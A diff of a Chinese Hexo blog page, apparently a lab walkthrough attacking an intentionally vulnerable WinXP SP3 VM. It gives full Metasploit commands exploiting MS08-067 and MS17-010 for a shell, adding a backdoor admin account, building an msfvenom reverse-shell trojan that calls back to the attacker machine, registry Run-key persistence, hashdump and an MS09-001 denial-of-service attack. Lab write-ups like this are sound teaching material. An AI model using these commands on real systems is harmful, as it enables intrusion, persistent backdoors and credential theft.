@@ -43,7 +43,11 @@
 	<script src="/js/Valine-RJyanzheng.js"></script>
 
     
-<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="简言之" type="application/atom+xml">
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="简言之" type="application/atom+xml">
 <link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
 <link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
@@ -906,10 +910,9 @@
 <p>下载链接：<a target="_blank" rel="noopener" href="https://jwt1399.lanzoui.com/iv2VJde68vc">https://jwt1399.lanzoui.com/iv2VJde68vc</a></p>
 <p><strong>安装&amp;配置：</strong></p>
 <p>1.下载好压缩包解压，导入<code>VWware</code>，启动<code>WinXPenSP3</code>,登陆密码为123456</p>
-<p>2.打开<code>Control Panel</code>—&gt;<code>Network Connections</code>—&gt;右击<code>Local Area Connection</code>—&gt;选择<code>properties</code>—&gt;双击<code>Internet Protocol(TCP/IP)</code>—&gt;勾选<code>Obtain an IP address automatically</code></p>
+<p>2.打开<code>Control Panel</code>–&gt;<code>Network Connections</code>–&gt;右击<code>Local Area Connection</code>–&gt;选择<code>properties</code>–&gt;双击<code>Internet Protocol(TCP/IP)</code>–&gt;勾选<code>Obtain an IP address automatically</code></p>
 <p>3.将该靶机网络适配器改为桥接模式，你的攻击机也改为桥接模式，保证他俩能正常通信</p>
 <h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>1.网络环境</p>
-<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -917,8 +920,7 @@
 <th>IP</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>攻击机：Kali-2020</td>
 <td>192.168.1.110</td>
 </tr>
@@ -926,11 +928,8 @@
 <td>靶    机：WinXP</td>
 <td>192.168.1.102</td>
 </tr>
-</tbody>
-</table>
-</div>
+</tbody></table>
 <p>2.主要使用工具</p>
-<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -938,8 +937,7 @@
 <th>Version</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>metasploit</td>
 <td>5.0.92</td>
 </tr>
@@ -951,137 +949,138 @@
 <td>Nessus</td>
 <td>8.10.0</td>
 </tr>
-</tbody>
-</table>
-</div>
+</tbody></table>
 <h2 id="目标-amp-任务"><a href="#目标-amp-任务" class="headerlink" title="目标&amp;任务"></a>目标&amp;任务</h2><p>1.探测靶机WinXPenSP3的漏洞&amp;利用</p>
 <p>2.利用漏洞Getshell</p>
 <p>3.提权&amp;持久化：增加Administrators权限用户，攻击机监听端口等待反弹shell，上传木马客服端程序，添加注册表信息，设置木马程序开机自启动等。</p>
-<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-探测目标"><a href="#1-探测目标" class="headerlink" title="1.探测目标"></a>1.探测目标</h3><pre class="line-numbers language-lang-bash"><code class="language-lang-bash">sudo arp-scan -l
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-探测目标"><a href="#1-探测目标" class="headerlink" title="1.探测目标"></a>1.探测目标</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> arp-scan -l
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603105438832.png" alt=""></p>
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603105438832.png"></p>
 <p>获得靶机IP: <code>192.168.1.102</code></p>
 <h3 id="2-探测开放端口"><a href="#2-探测开放端口" class="headerlink" title="2.探测开放端口"></a>2.探测开放端口</h3><pre><code>nmap -sV -p- 192.168.1.102
-</code></pre><p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603110750442.png" alt=""></p>
+</code></pre>
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603110750442.png"></p>
 <p>开放了端口<code>139，445</code>，这是<code>SMB协议</code>使用的端口，那么后面我们可以尝试使用nmap扫描smb相关漏洞</p>
 <blockquote>
 <p>注：SMB协议是基于TCP－NETBIOS下的，一般端口使用为139，445</p>
 </blockquote>
 <h3 id="3-根据开放端口进一步获取信息"><a href="#3-根据开放端口进一步获取信息" class="headerlink" title="3.根据开放端口进一步获取信息"></a>3.根据开放端口进一步获取信息</h3><p>尝试通过SMB 协议确定操作系统、计算机名称、域、工作组和当前时间。</p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">sudo nmap --script=smb-os-discovery.nse 192.168.1.102
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> nmap --script<span class="token operator">=</span>smb-os-discovery.nse 192.168.1.102
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603110846003.png" alt=""></p>
-<h2 id="二、漏洞扫描"><a href="#二、漏洞扫描" class="headerlink" title="二、漏洞扫描"></a>二、漏洞扫描</h2><h3 id="1-使用nmap扫描漏洞"><a href="#1-使用nmap扫描漏洞" class="headerlink" title="1.使用nmap扫描漏洞"></a>1.使用nmap扫描漏洞</h3><pre class="line-numbers language-lang-bash"><code class="language-lang-bash">sudo nmap --script=smb-check-vulns.nse 192.168.1.102
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603110846003.png"></p>
+<h2 id="二、漏洞扫描"><a href="#二、漏洞扫描" class="headerlink" title="二、漏洞扫描"></a>二、漏洞扫描</h2><h3 id="1-使用nmap扫描漏洞"><a href="#1-使用nmap扫描漏洞" class="headerlink" title="1.使用nmap扫描漏洞"></a>1.使用nmap扫描漏洞</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> nmap --script<span class="token operator">=</span>smb-check-vulns.nse 192.168.1.102
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><strong>直接执行会报错，因为新版Nmap，<code>smb-check-vulns.nse</code>脚本被取消了。</strong></p>
 <p>它被分为<code>smb-vuln-conficker、smb-vuln-cve2009-3103、smb-vuln-ms06-025、smb-vuln-ms07-029、smb-vuln-regsvc-dos、smb-vuln-ms08-067</code>这六个脚本,用户根据需要选择对应的脚本。</p>
 <p><strong>解决方案</strong></p>
 <p>1.直接进行全扫描(执行上方6个脚本)</p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">sudo nmap --script=smb-check-vulns-*.nse 192.168.1.102
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> nmap --script<span class="token operator">=</span>smb-check-vulns-*.nse 192.168.1.102
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>2.获取smb-check-vulns.nse，放入<code>/usr/share/nmap/scripts/</code>【nmap存放漏洞匹配文件的目录】</p>
 <p>smb-check-vulns.nse获取地址：<a target="_blank" rel="noopener" href="https://jwt1399.lanzoui.com/iYH7Wdg2k8j">https://jwt1399.lanzoui.com/iYH7Wdg2k8j</a></p>
-<p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603112358613.png" alt=""></p>
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603112358613.png"></p>
 <h3 id="2-使用Nessus扫描漏洞"><a href="#2-使用Nessus扫描漏洞" class="headerlink" title="2.使用Nessus扫描漏洞"></a>2.使用Nessus扫描漏洞</h3><p>通过Nessus扫面的漏洞报告，对各个漏洞逐一利用。</p>
-<p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603191541811.png" alt=""></p>
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603191541811.png"></p>
 <h2 id="三、漏洞利用-amp-提权"><a href="#三、漏洞利用-amp-提权" class="headerlink" title="三、漏洞利用&amp;提权"></a>三、漏洞利用&amp;提权</h2><h3 id="MS08-067"><a href="#MS08-067" class="headerlink" title="MS08-067"></a>MS08-067</h3><h4 id="MS08-067-漏洞利用"><a href="#MS08-067-漏洞利用" class="headerlink" title="MS08-067-漏洞利用"></a>MS08-067-漏洞利用</h4><p>1）首先运行metasploit，使用search ms08-067寻找可利用的漏洞点</p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">sudo msfdb init && msfconsole
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> msfdb init <span class="token operator">&amp;&amp;</span> msfconsole
 search MS08-067
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603112805731.png" alt=""></p>
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603112805731.png"></p>
 <p>2）使用攻击模块，使用show options查看我们需要设置的参数。</p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">use exploit/windows/smb/ms08_067_netapi
+<pre class="line-numbers language-bash"><code class="language-bash">use exploit/windows/smb/ms08_067_netapi
 
-show options #可以看到RHOSTS必须设置
+show options <span class="token comment" spellcheck="true">#可以看到RHOSTS必须设置</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603113031684.png" alt=""></p>
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603113031684.png"></p>
 <p>3）设置RHOSTS(远程IP),即靶机的ip，然后run或者exploit，成功Getshell</p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">set RHOSTS 192.168.1.102
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> RHOSTS 192.168.1.102
 run 或者 exploit
 shell
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603113343132.png" alt=""></p>
-<h4 id="MS08-067-提权"><a href="#MS08-067-提权" class="headerlink" title="MS08-067-提权"></a>MS08-067-提权</h4><h5 id="添加Administrators权限用户"><a href="#添加Administrators权限用户" class="headerlink" title="添加Administrators权限用户"></a>添加Administrators权限用户</h5><pre class="line-numbers language-lang-bash"><code class="language-lang-bash">#添加hacker用户
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603113343132.png"></p>
+<h4 id="MS08-067-提权"><a href="#MS08-067-提权" class="headerlink" title="MS08-067-提权"></a>MS08-067-提权</h4><h5 id="添加Administrators权限用户"><a href="#添加Administrators权限用户" class="headerlink" title="添加Administrators权限用户"></a>添加Administrators权限用户</h5><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#添加hacker用户</span>
 net user hacker hacker /add
 
-#添加hacker用户添加进administrators组
+<span class="token comment" spellcheck="true">#添加hacker用户添加进administrators组</span>
 net localgroup administrators hacker /add
 
-#查看用户
+<span class="token comment" spellcheck="true">#查看用户</span>
 net user
-#删除用户
-net user hacker /delete  #渗透结束后再删除，擦干净屁股再走
+<span class="token comment" spellcheck="true">#删除用户</span>
+net user hacker /delete  <span class="token comment" spellcheck="true">#渗透结束后再删除，擦干净屁股再走</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image020.jpg" alt=""></p>
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image020.jpg"></p>
 <p>可以看到成功添加了hacker用户</p>
 <h5 id="制作-amp-上传木马"><a href="#制作-amp-上传木马" class="headerlink" title="制作&amp;上传木马"></a>制作&amp;上传木马</h5><h6 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h6><p>监听端口等待反弹shell。使用<code>exploit/multi/handler</code>模块,并设置参数之后运行。</p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">use exploit/multi/handler
+<pre class="line-numbers language-bash"><code class="language-bash">use exploit/multi/handler     
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image022.jpg" alt=""></p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">set payload windows/meterpreter/reverse_tcp
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image022.jpg"></p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> payload windows/meterpreter/reverse_tcp
 show options
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image024.jpg" alt=""></p>
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image024.jpg"></p>
 <p>设置LHOST(本地IP，攻击机Kali的IP)和LPORT</p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">set LHOST 192.168.1.110
-set LPORT 12345   #也可以使用默认的4444端口
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> LHOST 192.168.1.110
+<span class="token keyword">set</span> LPORT 12345   <span class="token comment" spellcheck="true">#也可以使用默认的4444端口</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image026.jpg" alt=""></p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">run 或者 exploit
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image026.jpg"></p>
+<pre class="line-numbers language-bash"><code class="language-bash">run 或者 exploit
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image028.jpg" alt=""></p>
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image028.jpg"></p>
 <p>这里先放着，不要关窗口，监听端口等待后面我们上传木马反弹shell</p>
 <h6 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h6><p>使用msfvenom构造客户端木马程序，并上传</p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.110 LPORT=12345 -f exe -o jian.exe
+<pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p windows/shell/reverse_tcp LHOST<span class="token operator">=</span>192.168.1.110 LPORT<span class="token operator">=</span>12345 -f exe -o jian.exe
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image030.jpg" alt=""></p>
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image030.jpg"></p>
 <p>利用上面漏洞将做好的木马植入靶机</p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">sudo msfdb init && msfconsole
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> msfdb init <span class="token operator">&amp;&amp;</span> msfconsole
 search ms08-067
 use exploit/windows/smb/ms08_067_netapi
 show options
-set RHOSTS 192.168.1.102
+<span class="token keyword">set</span> RHOSTS 192.168.1.102
 Run
 shell
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>使用upload上传木马</p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">upload /home/kali/Desktop/jian.exe C:\\WINDOWS\\system32
+<pre class="line-numbers language-bash"><code class="language-bash">upload /home/kali/Desktop/jian.exe C:\\WINDOWS\\system32
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image032.jpg" alt=""></p>
-<p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image034.jpg" alt=""></p>
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image032.jpg"></p>
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image034.jpg"></p>
 <p>可以看到jian.exe已经成功上传到靶机</p>
 <p>在获取的shell上运行jian.exe，成功反弹shell到攻击机上【就是上面监听端口等待反弹shell的那个窗口】</p>
-<p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603120744598.png" alt=""></p>
-<p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image038.jpg" alt=""></p>
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603120744598.png"></p>
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image038.jpg"></p>
 <h5 id="设置木马开机启动"><a href="#设置木马开机启动" class="headerlink" title="设置木马开机启动"></a>设置木马开机启动</h5><p>设置木马开机启动：利用注册表添加后门，先查看原开机启动的应用</p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
+<pre class="line-numbers language-bash"><code class="language-bash">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image040.jpg" alt=""></p>
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image040.jpg"></p>
 <p>利用注册表增加开机启动应用,添加注册表信息，设置jian.exe开机自启。</p>
 <pre><code>reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v sys -d &#39;C:\WINDOWS\system32\jian.exe Ldp 443 -e cmd.exe&#39;
-</code></pre><p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image042.jpg" alt=""></p>
+</code></pre>
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image042.jpg"></p>
 <h4 id="其他操作"><a href="#其他操作" class="headerlink" title="其他操作"></a>其他操作</h4><p>还可以通过sysinfol来查看系统信息。</p>
-<p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image044.jpg" alt=""></p>
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image044.jpg"></p>
 <p>使用hashdump来查看系统用户名和密码的hash值，如果密码简单，可以通过爆破hash来得到登录密码。</p>
-<p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image046.jpg" alt=""></p>
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image046.jpg"></p>
 <h3 id="MS17-010-永恒之蓝"><a href="#MS17-010-永恒之蓝" class="headerlink" title="MS17-010(永恒之蓝)"></a>MS17-010(永恒之蓝)</h3><p>跟上面漏洞利用差不多</p>
-<p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image002-1591158343850.jpg" alt=""></p>
-<p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image004-1591158343851.jpg" alt=""></p>
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image002-1591158343850.jpg"></p>
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image004-1591158343851.jpg"></p>
 <p>成功getshell，后续操作跟前面一样</p>
 <h3 id="MS09-001"><a href="#MS09-001" class="headerlink" title="MS09-001"></a>MS09-001</h3><pre><code>sudo msfdb init &amp;&amp; msfconsole
 
 Search MS09-001
-</code></pre><p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image048.jpg" alt=""></p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">use auxiliary/dos/windows/smb/ms09_001_write
+</code></pre>
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image048.jpg"></p>
+<pre class="line-numbers language-bash"><code class="language-bash">use auxiliary/dos/windows/smb/ms09_001_write
 
 show options
 
-set RHOSTS 192.168.1.102
+<span class="token keyword">set</span> RHOSTS 192.168.1.102
 
 run 或者 exploit
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image050.jpg" alt=""></p>
-<p><img src="../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image052.jpg" alt=""></p>
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image050.jpg"></p>
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image052.jpg"></p>
 <p>对靶机发起了拒绝服务攻击,具体对靶机的影响暂时不知</p>
 <h2 id="赞助💰"><a href="#赞助💰" class="headerlink" title="赞助💰"></a>赞助💰</h2><p>如果你觉得对你有帮助，你可以赞助我一杯冰可乐！嘻嘻🤭</p>
 <table>
@@ -1869,7 +1868,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">712.3k</span>&nbsp;字
+                class="white-color">1051.4k</span>&nbsp;字
             
             
             
@@ -2100,22 +2099,6 @@ $(function () {
     
 
         
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-        tex2jax: {
-            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
-            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
-            processEscapes: true
-        }
-    });
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax();
-        for (var i = 0; i < all.length; ++i)
-            all[i].SourceElement().parentNode.className += ' has-jax';
-    });
-</script>
-<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
-
 </body>
 
 </html>
